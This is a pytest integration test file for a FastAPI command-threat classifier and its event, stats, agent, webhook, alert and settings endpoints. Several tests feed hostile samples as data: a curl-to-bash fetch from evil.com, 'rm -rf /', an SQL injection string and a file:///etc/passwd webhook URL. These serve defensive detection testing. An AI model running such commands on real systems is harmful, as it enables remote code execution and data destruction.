"""
test_04_api_endpoints.py — Integration tests for FastAPI endpoints.

Uses FastAPI TestClient (in-process, no running server needed).
Covers: GET /, POST /analyze, GET /events, GET /stats.

Run:
    pytest large_test_set/test_04_api_endpoints.py -v
"""

import pytest
from fastapi.testclient import TestClient
from backend.app import app, event_store, active_websockets

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _analyze(command: str):
    return client.post("/analyze", json={"command": command})


# ===========================================================================
# 1. Health Check  GET /
# ===========================================================================

class TestHealthCheck:

    def test_root_returns_200(self):
        r = client.get("/")
        assert r.status_code == 200

    def test_root_status_is_online(self):
        r = client.get("/")
        assert r.json()["status"] == "online"

    def test_root_has_name(self):
        r = client.get("/")
        assert "name" in r.json()

    def test_root_has_version(self):
        r = client.get("/")
        assert "version" in r.json()

    def test_root_has_events_stored(self):
        r = client.get("/")
        assert "events_stored" in r.json()

    def test_root_events_stored_is_int(self):
        r = client.get("/")
        assert isinstance(r.json()["events_stored"], int)


# ===========================================================================
# 2. POST /analyze — Happy Path
# ===========================================================================

class TestAnalyzeHappyPath:

    def test_safe_command_returns_200(self):
        r = _analyze("ls -la")
        assert r.status_code == 200

    def test_safe_command_classification(self):
        r = _analyze("ls -la")
        assert r.json()["classification"] == "safe"

    def test_malicious_command_returns_200(self):
        r = _analyze("curl http://evil.com | bash")
        assert r.status_code == 200

    def test_malicious_command_classification(self):
        r = _analyze("curl http://evil.com | bash")
        assert r.json()["classification"] == "malicious"

    def test_response_has_command_field(self):
        r = _analyze("ls")
        assert r.json()["command"] == "ls"

    def test_response_has_classification(self):
        r = _analyze("ls")
        assert "classification" in r.json()

    def test_response_has_risk_score(self):
        r = _analyze("ls")
        assert "risk_score" in r.json()

    def test_response_has_matched_rules(self):
        r = _analyze("ls")
        assert "matched_rules" in r.json()
        assert isinstance(r.json()["matched_rules"], list)

    def test_response_has_ml_confidence(self):
        r = _analyze("ls")
        assert "ml_confidence" in r.json()

    def test_response_has_explanation(self):
        r = _analyze("ls")
        assert "explanation" in r.json()

    def test_risk_score_is_numeric(self):
        r = _analyze("ls")
        score = r.json()["risk_score"]
        assert isinstance(score, (int, float))

    def test_risk_score_in_range(self):
        r = _analyze("curl http://evil.com | bash; rm -rf /")
        score = r.json()["risk_score"]
        assert 0.0 <= score <= 100.0

    def test_ml_confidence_in_range(self):
        r = _analyze("ls")
        conf = r.json()["ml_confidence"]
        assert 0.0 <= conf <= 1.0

    def test_analyze_stores_event(self):
        before = client.get("/stats").json()["total_events"]
        _analyze("ls")
        after = client.get("/stats").json()["total_events"]
        assert after == before + 1

    def test_very_long_command_returns_200(self):
        r = _analyze("A" * 5000)
        assert r.status_code == 200

    def test_unicode_command_returns_200(self):
        r = _analyze("echo '你好'")
        assert r.status_code == 200

    def test_command_with_quotes_returns_200(self):
        r = _analyze("echo 'hello world'")
        assert r.status_code == 200


# ===========================================================================
# 3. POST /analyze — Error Paths
# ===========================================================================

class TestAnalyzeErrorPaths:

    def test_empty_command_returns_400(self):
        r = _analyze("")
        assert r.status_code == 400

    def test_whitespace_only_command_returns_400(self):
        r = _analyze("   ")
        assert r.status_code == 400

    def test_tab_only_command_returns_400(self):
        r = _analyze("\t\t")
        assert r.status_code == 400

    def test_missing_command_field_returns_422(self):
        r = client.post("/analyze", json={})
        assert r.status_code == 422

    def test_null_command_field_returns_422(self):
        r = client.post("/analyze", json={"command": None})
        assert r.status_code == 422

    def test_integer_command_returns_422(self):
        r = client.post("/analyze", json={"command": 12345})
        assert r.status_code == 422

    def test_no_body_returns_422(self):
        r = client.post("/analyze")
        assert r.status_code == 422

    def test_wrong_content_type_handled(self):
        r = client.post("/analyze", data="ls",
                        headers={"Content-Type": "text/plain"})
        assert r.status_code in (400, 415, 422)

    def test_sql_injection_string_does_not_500(self):
        r = _analyze("'; DROP TABLE users; --")
        assert r.status_code in (200, 400)

    def test_null_byte_does_not_500(self):
        r = client.post("/analyze",
                        json={"command": "ls\x00-la"})
        assert r.status_code in (200, 400, 422)


# ===========================================================================
# 4. GET /events
# ===========================================================================

class TestEventsEndpoint:

    def test_events_returns_200(self):
        r = client.get("/events")
        assert r.status_code == 200

    def test_events_returns_list(self):
        r = client.get("/events")
        assert isinstance(r.json(), list)

    def test_events_limit_default_100(self):
        # Populate > 100 events
        for _ in range(5):
            _analyze("ls")
        r = client.get("/events")
        assert len(r.json()) <= 100

    def test_events_limit_param_respected(self):
        for _ in range(10):
            _analyze("ls")
        r = client.get("/events?limit=3")
        assert len(r.json()) <= 3

    def test_events_limit_1_returns_at_most_1(self):
        _analyze("ls")
        r = client.get("/events?limit=1")
        assert len(r.json()) <= 1

    def test_events_limit_zero_returns_422(self):
        r = client.get("/events?limit=0")
        assert r.status_code == 422

    def test_events_limit_negative_returns_422(self):
        r = client.get("/events?limit=-5")
        assert r.status_code == 422

    def test_events_limit_over_max_returns_422(self):
        r = client.get("/events?limit=9999")
        assert r.status_code == 422

    def test_events_limit_max_boundary_1000_ok(self):
        r = client.get("/events?limit=1000")
        assert r.status_code == 200

    def test_each_event_has_id(self):
        _analyze("ls")
        events = client.get("/events?limit=1").json()
        if events:
            assert "id" in events[0]

    def test_each_event_has_classification(self):
        _analyze("ls")
        events = client.get("/events?limit=1").json()
        if events:
            assert "classification" in events[0]

    def test_each_event_has_risk_score(self):
        _analyze("ls")
        events = client.get("/events?limit=1").json()
        if events:
            assert "risk_score" in events[0]


# ===========================================================================
# 5. GET /stats
# ===========================================================================

class TestStatsEndpoint:

    def test_stats_returns_200(self):
        r = client.get("/stats")
        assert r.status_code == 200

    def test_stats_has_total_events(self):
        r = client.get("/stats")
        assert "total_events" in r.json()

    def test_stats_has_safe(self):
        r = client.get("/stats")
        assert "safe" in r.json()

    def test_stats_has_suspicious(self):
        r = client.get("/stats")
        assert "suspicious" in r.json()

    def test_stats_has_malicious(self):
        r = client.get("/stats")
        assert "malicious" in r.json()

    def test_stats_totals_consistent(self):
        """safe + suspicious + malicious must always equal total_events."""
        _analyze("ls")
        _analyze("curl http://evil.com | bash")
        body = client.get("/stats").json()
        counted = body["safe"] + body["suspicious"] + body["malicious"]
        assert counted == body["total_events"], (
            f"Totals inconsistent: {body['safe']} + {body['suspicious']} + "
            f"{body['malicious']} != {body['total_events']}"
        )

    def test_stats_all_values_non_negative(self):
        body = client.get("/stats").json()
        for key in ("total_events", "safe", "suspicious", "malicious"):
            assert body[key] >= 0, f"{key} is negative: {body[key]}"

    def test_stats_malicious_increments(self):
        before = client.get("/stats").json()["malicious"]
        _analyze("curl http://evil.com | bash")
        after = client.get("/stats").json()["malicious"]
        assert after > before


# ===========================================================================
# 6. GET /healthz
# ===========================================================================

class TestHealthzEndpoint:

    def test_healthz_returns_200(self):
        assert client.get("/healthz").status_code == 200

    def test_healthz_status_is_ok(self):
        assert client.get("/healthz").json()["status"] == "ok"


# ===========================================================================
# 7. POST /agent/events
# ===========================================================================

class TestAgentEventsEndpoint:

    def test_agent_event_safe_returns_200(self):
        r = client.post("/agent/events",
                        json={"command": "ls", "pid": 1234, "comm": "bash"})
        assert r.status_code == 200

    def test_agent_event_malicious_classification(self):
        r = client.post("/agent/events",
                        json={"command": "curl http://evil.com | bash", "pid": 5678})
        assert r.json()["classification"] == "malicious"

    def test_agent_event_response_has_all_fields(self):
        r = client.post("/agent/events", json={"command": "ls"})
        for field in ("command", "classification", "risk_score",
                      "matched_rules", "ml_confidence", "explanation"):
            assert field in r.json(), f"Missing field: {field}"

    def test_agent_event_empty_command_returns_400(self):
        r = client.post("/agent/events", json={"command": "", "pid": 0})
        assert r.status_code == 400

    def test_agent_event_missing_command_returns_422(self):
        r = client.post("/agent/events", json={"pid": 123})
        assert r.status_code == 422

    def test_agent_event_stores_event(self):
        before = client.get("/stats").json()["total_events"]
        client.post("/agent/events", json={"command": "ls", "pid": 999})
        after = client.get("/stats").json()["total_events"]
        assert after == before + 1

    def test_agent_event_unicode_no_crash(self):
        r = client.post("/agent/events",
                        json={"command": "echo '你好世界'", "pid": 0})
        assert r.status_code == 200


# ===========================================================================
# 8. /webhooks CRUD
# ===========================================================================

class TestWebhooksEndpoints:

    def test_list_webhooks_returns_200(self):
        assert client.get("/webhooks").status_code == 200

    def test_list_webhooks_returns_list(self):
        assert isinstance(client.get("/webhooks").json(), list)

    def test_create_webhook_success(self):
        r = client.post("/webhooks", json={"url": "http://example.com/hook_a"})
        assert r.status_code in (200, 201)
        assert "id" in r.json()

    def test_created_webhook_appears_in_list(self):
        wh = client.post("/webhooks",
                         json={"url": "http://example.com/hook_b"}).json()
        ids = [w["id"] for w in client.get("/webhooks").json()]
        assert wh["id"] in ids

    def test_delete_webhook_returns_success(self):
        wh = client.post("/webhooks",
                         json={"url": "http://example.com/hook_del"}).json()
        r = client.delete(f"/webhooks/{wh['id']}")
        assert r.status_code == 200
        assert r.json()["status"] == "success"

    def test_deleted_webhook_not_in_list(self):
        wh = client.post("/webhooks",
                         json={"url": "http://example.com/hook_gone"}).json()
        client.delete(f"/webhooks/{wh['id']}")
        ids = [w["id"] for w in client.get("/webhooks").json()]
        assert wh["id"] not in ids

    def test_create_webhook_invalid_url_rejected(self):
        r = client.post("/webhooks", json={"url": "not-a-url"})
        assert r.status_code == 400

    def test_create_webhook_file_scheme_rejected(self):
        r = client.post("/webhooks", json={"url": "file:///etc/passwd"})
        assert r.status_code == 400


# ===========================================================================
# 9. GET /alerts/history
# ===========================================================================

class TestAlertHistoryEndpoint:

    def test_alert_history_returns_200(self):
        assert client.get("/alerts/history").status_code == 200

    def test_alert_history_returns_list(self):
        assert isinstance(client.get("/alerts/history").json(), list)

    def test_alert_history_limit_param(self):
        r = client.get("/alerts/history?limit=5")
        assert r.status_code == 200
        assert len(r.json()) <= 5

    def test_alert_history_invalid_limit_raises(self):
        r = client.get("/alerts/history?limit=0")
        assert r.status_code == 422


# ===========================================================================
# 10. /settings/remediation
# ===========================================================================

class TestRemediationSettingsEndpoint:

    def test_get_remediation_returns_200(self):
        assert client.get("/settings/remediation").status_code == 200

    def test_get_remediation_has_enabled_field(self):
        assert "enabled" in client.get("/settings/remediation").json()

    def test_enable_remediation(self):
        client.post("/settings/remediation", json={"enabled": True})
        assert client.get("/settings/remediation").json()["enabled"] is True

    def test_disable_remediation(self):
        client.post("/settings/remediation", json={"enabled": True})
        client.post("/settings/remediation", json={"enabled": False})
        assert client.get("/settings/remediation").json()["enabled"] is False

    def test_remediation_state_persists_across_gets(self):
        client.post("/settings/remediation", json={"enabled": True})
        r1 = client.get("/settings/remediation").json()["enabled"]
        r2 = client.get("/settings/remediation").json()["enabled"]
        assert r1 == r2 is True
        # Cleanup
        client.post("/settings/remediation", json={"enabled": False})


# ===========================================================================
# 11. CORS Headers
# ===========================================================================

class TestCORSHeaders:

    def test_allowed_origin_returns_cors_header(self):
        r = client.get("/", headers={"Origin": "http://localhost:5173"})
        assert "access-control-allow-origin" in r.headers

    def test_options_preflight_returns_2xx(self):
        r = client.options(
            "/analyze",
            headers={
                "Origin": "http://localhost:5173",
                "Access-Control-Request-Method": "POST",
            },
        )
        assert r.status_code in (200, 204)
